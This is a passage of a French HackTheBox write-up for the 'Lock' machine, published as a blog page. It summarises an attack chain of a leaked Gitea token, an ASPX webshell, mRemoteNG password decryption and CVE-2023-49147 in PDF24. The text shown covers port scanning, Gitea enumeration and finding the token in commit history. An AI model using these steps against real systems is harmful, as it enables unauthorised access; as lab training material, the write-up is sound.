@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Lock - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/lock/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="Lock">
+  <meta property="og:description" content="Lock est une machine Windows de difficulté facile qui consiste à parcourir un dépôt Gitea pour trouver un jeton d’accès personnel. Ce jeton est ensuite utilisé pour déployer un webshell ASPX sur le serveur, ce qui permet d’établir un premier point d’entrée. Un mot de passe est ensuite déchiffré à partir d’un fichier de configuration mRemoteNG, donnant accès à un nouveau compte utilisateur. Enfin, une vulnérabilité d’élévation de privilèges locale dans l’application PDF24 est exploitée pour obtenir un shell avec les privilèges SYSTEM.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:modified_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="CVE-2023-49147">
+    <meta property="article:tag" content="Gitea">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Lock">
+  <meta name="twitter:description" content="Lock est une machine Windows de difficulté facile qui consiste à parcourir un dépôt Gitea pour trouver un jeton d’accès personnel. Ce jeton est ensuite utilisé pour déployer un webshell ASPX sur le serveur, ce qui permet d’établir un premier point d’entrée. Un mot de passe est ensuite déchiffré à partir d’un fichier de configuration mRemoteNG, donnant accès à un nouveau compte utilisateur. Enfin, une vulnérabilité d’élévation de privilèges locale dans l’application PDF24 est exploitée pour obtenir un shell avec les privilèges SYSTEM.">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/lock/" /><link rel="prev" href="http://localhost:1313/manager/" /><link rel="next" href="http://localhost:1313/haze/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Lock",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/lock\/"
+        },"genre": "posts","keywords": "Easy, Windows, Active Directory, CVE-2023-49147, Gitea","wordcount":  1741 ,
+        "url": "http:\/\/localhost:1313\/lock\/","datePublished": "2025-12-11T10:28:41+00:00","dateModified": "2025-12-11T10:28:41+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Lock</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;1741 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;9 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#énumération">Énumération</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#http---tcp-80">HTTP - TCP 80</a></li>
+        <li><a href="#http---tcp-3000">HTTP - TCP 3000</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-en-tant-que-ellenfreeman">Shell en tant que Ellen.Freeman</a>
+      <ul>
+        <li><a href="#énumérer-gitea">Énumérer Gitea</a></li>
+        <li><a href="#shell">Shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-en-tant-que-galedekarios">Shell en tant que Gale.Dekarios</a>
+      <ul>
+        <li><a href="#énumération-1">Énumération</a></li>
+        <li><a href="#connexion-rdp">Connexion RDP</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-en-tant-que-nt-authoritysystem">Shell en tant que nt authority\system</a>
+      <ul>
+        <li><a href="#énumération-2">Énumération</a></li>
+        <li><a href="#cve-2023-49147">CVE-2023-49147</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/lock.png"
+        data-srcset="/images/Lock/lock.png, /images/Lock/lock.png 1.5x, /images/Lock/lock.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/lock.png"
+        title="Lock" width="617" height="337" /></p>
+<p>Lock est une machine Windows de difficulté facile qui consiste à parcourir un dépôt <strong>Gitea</strong> pour trouver un jeton d&rsquo;accès personnel. Ce jeton est ensuite utilisé pour déployer un <strong>webshell ASPX</strong> sur le serveur, ce qui permet d&rsquo;établir un premier point d&rsquo;entrée. Un mot de passe est ensuite déchiffré à partir d&rsquo;un fichier de configuration <strong>mRemoteNG</strong>, donnant accès à un nouveau compte utilisateur. Enfin, une vulnérabilité d&rsquo;élévation de privilèges locale dans l&rsquo;application <strong><code>PDF24</code></strong> est exploitée pour obtenir un shell avec les privilèges SYSTEM.</p>
+<h1 id="énumération">Énumération</h1>
+<h2 id="nmap">Nmap</h2>
+<p>Je lance un scan tcp complet.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">rustscan -a 10.129.234.64 -u <span class="m">5000</span> -- -sV -sC</span></span></code></pre></div></div>
+<p>Le scan révèle 4 ports ouverts : HTTP (80), SMB (445), HTTP (3000) et RDP (3389).</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PORT     STATE SERVICE       REASON          VERSION
+</span></span><span class="line"><span class="cl">80/tcp   open  http          syn-ack ttl <span class="m">127</span> Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Lock - Index
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Supported Methods: OPTIONS TRACE GET HEAD POST
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds? syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3000/tcp open  ppp?          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GenericLines, Help, RTSPRequest:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">400</span> Bad Request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Cache-Control: max-age<span class="o">=</span>0, private, must-revalidate, no-transform
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Set-Cookie: <span class="nv">i_like_gitea</span><span class="o">=</span>d6a9bdfe1fd45bf8<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Set-Cookie: <span class="nv">_csrf</span><span class="o">=</span>uBfq42FCCVXKIP_QHZCr1lAuh4A6MTc2MTU5MjA4NzYwNTQyODIwMA<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> Max-Age<span class="o">=</span>86400<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Frame-Options: SAMEORIGIN
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Mon, <span class="m">27</span> Oct <span class="m">2025</span> 19:08:08 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en-US&#34;</span> <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;theme-auto&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;manifest&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   HTTPOptions:
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     HTTP/1.0 405 Method Not Allowed
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Allow: HEAD
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Allow: GET
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Set-Cookie: i_like_gitea=a585955febfa99ab; Path=/; HttpOnly; SameSite=Lax
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Set-Cookie: _csrf=UTMtZoVWiFIolRWbKKQRXGH9jSc6MTc2MTU5MjA5Mzk1ODg1NzkwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     X-Frame-Options: SAMEORIGIN
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Date: Mon, 27 Oct 2025 19:08:13 GMT
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_    Content-Length: 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_ssl-date: 2025-10-27T19:10:11+00:00; 0s from scanner time.
+</span></span></span><span class="line"><span class="cl"><span class="s2">| rdp-ntlm-info:
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   Target_Name: LOCK
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   NetBIOS_Domain_Name: LOCK
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   NetBIOS_Computer_Name: LOCK
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   DNS_Domain_Name: Lock
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   DNS_Computer_Name: Lock
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   Product_Version: 10.0.20348
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_  System_Time: 2025-10-27T19:09:31+00:00
+</span></span></span><span class="line"><span class="cl"><span class="s2">| ssl-cert: Subject: commonName=Lock
+</span></span></span><span class="line"><span class="cl"><span class="s2">| Issuer: commonName=Lock
+</span></span></span><span class="line"><span class="cl"><span class="s2">| Public Key type: rsa
+</span></span></span><span class="line"><span class="cl"><span class="s2">| Public Key bits: 2048
+</span></span></span><span class="line"><span class="cl"><span class="s2">| Signature Algorithm: sha256WithRSAEncryption
+</span></span></span><span class="line"><span class="cl"><span class="s2">| Not valid before: 2025-10-26T19:04:17
+</span></span></span><span class="line"><span class="cl"><span class="s2">| Not valid after:  2026-04-27T19:04:17
+</span></span></span><span class="line"><span class="cl"><span class="s2">| MD5:   c6ed4248d4dd03c44acea384598406b2
+</span></span></span><span class="line"><span class="cl"><span class="s2">| SHA-1: f42aab4b696e9903722fdf37c52486e884a90ab7</span></span></span></code></pre></div></div>
+<h2 id="http---tcp-80">HTTP - TCP 80</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-1.png"
+        data-srcset="/images/Lock/Lock-1.png, /images/Lock/Lock-1.png 1.5x, /images/Lock/Lock-1.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-1.png"
+        title="/images/Lock/Lock-1.png" width="1918" height="939" /></p>
+<h2 id="http---tcp-3000">HTTP - TCP 3000</h2>
+<p>Le port <strong>3000</strong> héberge une instance Gitea.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-2.png"
+        data-srcset="/images/Lock/Lock-2.png, /images/Lock/Lock-2.png 1.5x, /images/Lock/Lock-2.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-2.png"
+        title="/images/Lock/Lock-2.png" width="1920" height="940" /></p>
+<p>Avec l&rsquo;extension <code>Wappalyzer</code>, je vois qu&rsquo;il s&rsquo;agit d&rsquo;un site <code>ASP.NET</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-10.png"
+        data-srcset="/images/Lock/Lock-10.png, /images/Lock/Lock-10.png 1.5x, /images/Lock/Lock-10.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-10.png"
+        title="/images/Lock/Lock-10.png" width="506" height="554" /></p>
+<p>Dans l&rsquo;onglet Explore, se trouve un repo <code>dev-scripts</code> appartenant à l&rsquo;utilisateur <code>ellen.freeman</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-3.png"
+        data-srcset="/images/Lock/Lock-3.png, /images/Lock/Lock-3.png 1.5x, /images/Lock/Lock-3.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-3.png"
+        title="/images/Lock/Lock-3.png" width="1662" height="315" /></p>
+<p>Je vois qu&rsquo;il n&rsquo;y a que deux utilisateurs Gitea.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-4.png"
+        data-srcset="/images/Lock/Lock-4.png, /images/Lock/Lock-4.png 1.5x, /images/Lock/Lock-4.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-4.png"
+        title="/images/Lock/Lock-4.png" width="1351" height="300" /></p>
+<p>Le repo contient un script python.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-5.png"
+        data-srcset="/images/Lock/Lock-5.png, /images/Lock/Lock-5.png 1.5x, /images/Lock/Lock-5.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-5.png"
+        title="/images/Lock/Lock-5.png" width="1310" height="318" /></p>
+<p>Ce script sert à lister les repos d&rsquo;une instance Gitea. Mais pour cela, il utilise la variable d&rsquo;environnement <code>GITEA_ACCESS_TOKEN</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">format_domain</span><span class="p">(</span><span class="n">domain</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">domain</span><span class="o">.</span><span class="n">startswith</span><span class="p">((</span><span class="s1">&#39;http://&#39;</span><span class="p">,</span> <span class="s1">&#39;https://&#39;</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">domain</span> <span class="o">=</span> <span class="s1">&#39;https://&#39;</span> <span class="o">+</span> <span class="n">domain</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">domain</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_repositories</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">domain</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Authorization&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;token </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s1">/api/v1/user/repos&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Failed to retrieve repositories: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Usage: python script.py &lt;gitea_domain&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">gitea_domain</span> <span class="o">=</span> <span class="n">format_domain</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">personal_access_token</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;GITEA_ACCESS_TOKEN&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">personal_access_token</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Error: GITEA_ACCESS_TOKEN environment variable not set.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">repos</span> <span class="o">=</span> <span class="n">get_repositories</span><span class="p">(</span><span class="n">personal_access_token</span><span class="p">,</span> <span class="n">gitea_domain</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Repositories:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">repo</span> <span class="ow">in</span> <span class="n">repos</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;- </span><span class="si">{</span><span class="n">repo</span><span class="p">[</span><span class="s1">&#39;full_name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span></span></span></code></pre></div></div>
+<p>Je vois qu&rsquo;il y a deux commits.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-6.png"
+        data-srcset="/images/Lock/Lock-6.png, /images/Lock/Lock-6.png 1.5x, /images/Lock/Lock-6.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-6.png"
+        title="/images/Lock/Lock-6.png" width="670" height="312" /></p>
+<p>Dans le 1er (<code>Add repos.py</code>), se trouve la valeur de la variable d&rsquo;environnement.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-7.png"
+        data-srcset="/images/Lock/Lock-7.png, /images/Lock/Lock-7.png 1.5x, /images/Lock/Lock-7.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-7.png"
+        title="/images/Lock/Lock-7.png" width="648" height="741" /></p>
+<p>Dans le second commit (<code>Update repos.py</code>), je voit que la variable <code>PERSONAL_ACCESS_TOKEN</code> a été supprimée.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-8.png"
+        data-srcset="/images/Lock/Lock-8.png, /images/Lock/Lock-8.png 1.5x, /images/Lock/Lock-8.png 2x"
